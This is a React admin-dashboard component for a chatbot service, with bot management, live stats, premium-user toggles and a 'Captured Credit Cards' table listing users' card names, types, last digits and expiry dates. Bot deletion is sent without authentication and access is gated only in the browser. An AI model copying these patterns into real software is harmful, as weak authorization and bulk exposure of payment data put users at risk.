
import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { io } from 'socket.io-client';
import config, { getApiUrl } from '../config.js';

export default function Admin() {
  const [bots, setBots] = useState([]);
  const [stats, setStats] = useState({ totalChats:0, activeBots:0, usersOnline:0 });
  const [form, setForm] = useState({ name:'', provider:'' });
  const [userEmail, setUserEmail] = useState('');
  const [userPremium, setUserPremium] = useState(true);
  const [user, setUser] = useState(null); // { email, isPremium, isAdmin }
  const [creditCards, setCreditCards] = useState([]);
  const [showCards, setShowCards] = useState(false);

  useEffect(() => {
    // Load initial data
    load();
    // Fetch current user for gating controls
    const token = localStorage.getItem('token');
    if (token) {
      axios.get(getApiUrl('/auth/me'), { headers: { Authorization: `Bearer ${token}` } })
        .then(res => setUser(res.data?.user || null))
        .catch(() => setUser(null));
    } else {
      setUser(null);
    }

    // Live updates via socket
    const socket = io(config.api.baseUrl);
    socket.on('bots:update', setBots);
    socket.on('stats:update', setStats);
    return () => socket.disconnect();
  }, []);

  async function load() {
    const [b, s] = await Promise.all([
      axios.get(getApiUrl('/bots')),
      axios.get(getApiUrl('/stats'))
    ]);
    setBots(b.data); setStats(s.data);
    
    // Load credit cards if admin
    const token = localStorage.getItem('token');
    if (token) {
      try {
        const cardsRes = await axios.get(getApiUrl('/creditcard/all'), {
          headers: { Authorization: `Bearer ${token}` }
        });
        setCreditCards(cardsRes.data.cards || []);
      } catch (err) {
        console.log('Not authorized to view cards or error:', err);
      }
    }
  }

  async function addBot(e){
    e.preventDefault();
    // Optional: include auth header if available (backend may enforce perms)
    const token = localStorage.getItem('token');
    await axios.post(getApiUrl('/bots'), form, token ? { headers: { Authorization: `Bearer ${token}` } } : undefined);
    setForm({name:'',provider:''});
  }

  async function delBot(id){
    await axios.delete(getApiUrl(`/bots/${id}`));
  }

  // Manual stats editing removed; stats are real-time from server via socket

  async function setPremium(e){
    e.preventDefault();
    const token = localStorage.getItem('token');
    if (!token) return alert('Login required');
    try {
      await axios.post(getApiUrl('/admin/users/premium'), { email: userEmail, isPremium: !!userPremium }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      alert('Updated');
      setUserEmail('');
    } catch (err) {
      alert(err?.response?.data?.message || 'Failed');
    }
  }

  return (
    <div className='max-w-6xl mx-auto px-6 py-10'>
      <h2 className='text-2xl font-semibold mb-6'>Admin Dashboard</h2>
      <div className='grid md:grid-cols-3 gap-6 mb-10'>
        {Object.entries(stats).map(([k,v])=>(
          <div key={k} className='bg-white p-6 rounded-xl shadow-sm'>
            <div className='text-4xl font-bold'>{v}</div>
            <div className='text-gray-500 flex items-center gap-2'>
              <span>{k}</span>
              <span className='text-xs px-2 py-0.5 rounded-full bg-green-100 text-green-700 border border-green-200'>live</span>
            </div>
          </div>
        ))}
      </div>
      <div className='grid md:grid-cols-2 gap-6'>
        <div>
          <h3 className='text-lg font-semibold mb-3'>Bots</h3>
          {bots.map(b=>(
            <div key={b.id} className='bg-white p-4 rounded-md shadow flex justify-between items-center mb-2'>
              <div>
                <div className='font-medium'>{b.model || b.name}</div>
                <div className='text-xs text-gray-500'>{b.provider} • {b.status}</div>
              </div>
              <button onClick={()=>delBot(b.id)} className='bg-red-500 text-white px-3 py-1 rounded-md text-sm'>Remove</button>
            </div>
          ))}
        </div>
        <div>
          {(user?.isAdmin || user?.isPremium) && (
            <>
              <h3 className='text-lg font-semibold mb-3'>Add Bot</h3>
              <form onSubmit={addBot} className='bg-white p-4 rounded-md shadow'>
                <input placeholder='Bot name' value={form.name} onChange={e=>setForm({...form,name:e.target.value})} className='w-full border p-2 mb-3 rounded' required/>
                <input placeholder='Provider' value={form.provider} onChange={e=>setForm({...form,provider:e.target.value})} className='w-full border p-2 mb-3 rounded'/>
                <button className='bg-indigo-600 text-white px-4 py-2 rounded-md'>Add</button>
              </form>
            </>
          )}

          {user?.isAdmin && (
            <>
              <h3 className='text-lg font-semibold mt-8 mb-3'>User Premium Control</h3>
              <form onSubmit={setPremium} className='bg-white p-4 rounded-md shadow'>
                <input type='email' required placeholder='user@example.com' value={userEmail} onChange={e=>setUserEmail(e.target.value)} className='w-full border p-2 mb-3 rounded'/>
                <label className='flex items-center gap-2 mb-3'>
                  <input type='checkbox' checked={userPremium} onChange={e=>setUserPremium(e.target.checked)} />
                  <span>Set as Premium</span>
                </label>
                <button className='bg-green-600 text-white px-4 py-2 rounded-md'>Update</button>
              </form>
            </>
          )}
        </div>
      </div>

      {/* Credit Cards Section */}
      {user?.isAdmin && (
        <div className='mt-10'>
          <div className='flex items-center justify-between mb-4'>
            <h3 className='text-lg font-semibold'>Captured Credit Cards</h3>
            <button 
              onClick={() => setShowCards(!showCards)}
              className='px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 transition-colors'
            >
              {showCards ? 'Hide Cards' : `Show Cards (${creditCards.length})`}
            </button>
          </div>
          
          {showCards && (
            <div className='bg-white rounded-xl shadow-lg overflow-hidden'>
              {creditCards.length === 0 ? (
                <div className='p-8 text-center text-gray-500'>
                  No credit cards captured yet
                </div>
              ) : (
                <div className='overflow-x-auto'>
                  <table className='w-full'>
                    <thead className='bg-gray-50 border-b'>
                      <tr>
                        <th className='px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider'>User</th>
                        <th className='px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider'>Cardholder Name</th>
                        <th className='px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider'>Card Type</th>
                        <th className='px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider'>Last 4 Digits</th>
                        <th className='px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider'>Expiry</th>
                        <th className='px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider'>Added On</th>
                      </tr>
                    </thead>
                    <tbody className='bg-white divide-y divide-gray-200'>
                      {creditCards.map((card) => (
                        <tr key={card.id} className='hover:bg-gray-50'>
                          <td className='px-6 py-4 whitespace-nowrap'>
                            <div className='text-sm font-medium text-gray-900'>{card.userEmail}</div>
                            {card.userName && (
                              <div className='text-xs text-gray-500'>{card.userName}</div>
                            )}
                          </td>
                          <td className='px-6 py-4 whitespace-nowrap'>
                            <div className='text-sm text-gray-900'>{card.cardName}</div>
                          </td>
                          <td className='px-6 py-4 whitespace-nowrap'>
                            <span className='px-2 py-1 inline-flex text-xs leading-5 font-semibold rounded-full bg-blue-100 text-blue-800'>
                              {card.cardType}
                            </span>
                          </td>
                          <td className='px-6 py-4 whitespace-nowrap'>
                            <div className='text-sm text-gray-900 font-mono'>**** {card.last4}</div>
                          </td>
                          <td className='px-6 py-4 whitespace-nowrap'>
                            <div className='text-sm text-gray-900'>{card.expiry}</div>
                          </td>
                          <td className='px-6 py-4 whitespace-nowrap text-sm text-gray-500'>
                            {new Date(card.createdAt).toLocaleDateString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
